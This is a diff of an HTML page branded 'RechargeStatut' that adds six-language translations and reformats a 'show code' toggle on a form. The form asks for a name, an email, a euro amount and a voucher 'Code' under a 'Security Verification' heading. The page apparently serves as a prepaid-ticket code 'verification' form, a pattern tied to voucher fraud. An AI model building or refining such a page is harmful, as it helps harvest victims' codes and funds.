@@ -196,12 +196,18 @@
                 </div>
               </div>
 
-              <div class="code-toggle-container">
-              <p style="margin-bottom: 10px; font-size: 0.85rem; font-weight: 600; color: var(--text-light);" id="lbl-show-code">Afficher le code :</p>
-              <div class="code-toggle">
-                <label><input type="radio" name="show_code" value="oui" onclick="toggleCode(true)"><span id="txt-oui">Oui</span></label>
-                <label><input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)"><span id="txt-non">Non</span></label>
-              </div>
+             <div class="code-toggle-container">
+            <p style="margin-bottom: 10px; font-size: 0.85rem; font-weight: 600; color: var(--text-light);" id="lbl-show-code" data-i18n="show_code_label">Afficher le code :</p>
+            <div class="code-toggle">
+              <label>
+                  <input type="radio" name="show_code" value="oui" onclick="toggleCode(true)">
+                  <span id="txt-oui" data-i18n="option_yes">Oui</span>
+              </label>
+              <label>
+                  <input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)">
+                  <span id="txt-non" data-i18n="option_no">Non</span>
+              </label>
+            </div>
           </div>
               <div class="col-12 mt-4">
                 <button type="submit" id="submitBtn" class="btn btn-fintech" data-i18n="btn_submit">Authentifier</button>
@@ -222,13 +228,100 @@
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/js/bootstrap.bundle.min.js"></script>
   <script>
     const translations = {
+  fr: { 
+    brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', 
+    form_title: 'Vérification de sécurité', 
+    label_lastname: 'Nom', 
+    label_firstname: 'Prénom', 
+    label_email: 'Votre adresse email', 
+    label_amount: 'Montant (€)', 
+    label_code: 'Code', 
+    btn_submit: 'Authentifier', 
+    show_code_label: 'Afficher le code :',
+    option_yes: 'Oui',
+    option_no: 'Non',
+    footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — Tous droits réservés.' 
+  },
+  en: { 
+    brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', 
+    form_title: 'Security Verification', 
+    label_lastname: 'Last Name', 
+    label_firstname: 'First Name', 
+    label_email: 'Your Email Address', 
+    label_amount: 'Amount (€)', 
+    label_code: 'Code', 
+    btn_submit: 'Authenticate', 
+    show_code_label: 'Show code:',
+    option_yes: 'Yes',
+    option_no: 'No',
+    footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — All rights reserved.' 
+  },
+  es: { 
+    brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', 
+    form_title: 'Verificación de Seguridad', 
+    label_lastname: 'Apellido', 
+    label_firstname: 'Nombre', 
+    label_email: 'Tu Correo Electrónico', 
+    label_amount: 'Monto (€)', 
+    label_code: 'Código', 
+    btn_submit: 'Autenticar', 
+    show_code_label: 'Mostrar código:',
+    option_yes: 'Sí',
+    option_no: 'No',
+    footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — Todos los derechos reservados.' 
+  },
+  de: { 
+    brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', 
+    form_title: 'Sicherheitsüberprüfung', 
+    label_lastname: 'Nachname', 
+    label_firstname: 'Vorname', 
+    label_email: 'Deine E-Mail-Adresse', 
+    label_amount: 'Betrag (€)', 
+    label_code: 'Code', 
+    btn_submit: 'Authentifizieren', 
+    show_code_label: 'Code anzeigen:',
+    option_yes: 'Ja',
+    option_no: 'Nein',
+    footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — Alle Rechte vorbehalten.' 
+  },
+  it: { 
+    brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', 
+    form_title: 'Verifica di sicurezza', 
+    label_lastname: 'Cognome', 
+    label_firstname: 'Nome', 
+    label_email: 'Il tuo indirizzo email', 
+    label_amount: 'Importo (€)', 
+    label_code: 'Codice', 
+    btn_submit: 'Autentica', 
+    show_code_label: 'Mostra codice:',
+    option_yes: 'Sì',
+    option_no: 'No',
+    footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — Tutti i diritti riservati.' 
+  },
+  pt: { 
+    brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', 
+    form_title: 'Verificação de Segurança', 
+    label_lastname: 'Apelido', 
+    label_firstname: 'Nome', 
+    label_email: 'O seu endereço de e-mail', 
+    label_amount: 'Valor (€)', 
+    label_code: 'Código', 
+    btn_submit: 'Autenticar', 
+    show_code_label: 'Mostrar código:',
+    option_yes: 'Sim',
+    option_no: 'Não',
+    footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — Todos os direitos reservados.' 
+  }
+};
+    /*
+    const translations = {
       fr: { brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', form_title: 'Vérification de sécurité', label_lastname: 'Nom', label_firstname: 'Prénom', label_email: 'Votre adresse email', label_amount: 'Montant (€)', label_code: 'Code', btn_submit: 'Authentifier', footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — Tous droits réservés.' },
       en: { brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', form_title: 'Security Verification', label_lastname: 'Last Name', label_firstname: 'First Name', label_email: 'Your Email Address', label_amount: 'Amount (€)', label_code: 'Code', btn_submit: 'Authenticate', footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — All rights reserved.' },
       es: { brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', form_title: 'Verificación de Seguridad', label_lastname: 'Apellido', label_firstname: 'Nombre', label_email: 'Tu Correo Electrónico', label_amount: 'Monto (€)', label_code: 'Código', btn_submit: 'Autenticar', footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — Todos los derechos reservados.' },
       de: { brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', form_title: 'Sicherheitsüberprüfung', label_lastname: 'Nachname', label_firstname: 'Vorname', label_email: 'Deine E-Mail-Adresse', label_amount: 'Betrag (€)', label_code: 'Code', btn_submit: 'Authentifizieren', footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — Alle Rechte vorbehalten.' },
       it: { brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', form_title: 'Verifica di sicurezza', label_lastname: 'Cognome', label_firstname: 'Nome', label_email: 'Il tuo indirizzo email', label_amount: 'Importo (€)', label_code: 'Codice', btn_submit: 'Autentica', footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — Tutti i diritti riservati.' },
       pt: { brand: '<i class="bi bi-shield-check text-primary"></i> RechargeStatut<span class="text-primary">.</span>', form_title: 'Verificação de Segurança', label_lastname: 'Apelido', label_firstname: 'Nome', label_email: 'O seu endereço de e-mail', label_amount: 'Valor (€)', label_code: 'Código', btn_submit: 'Autenticar', footer_copyright: '&copy; 2026 RechargeStatut-Tickets.com — Todos os direitos reservados.' }
-    };
+    }; */
 
     function toggleCode(show) {
   const field = document.getElementById("code");
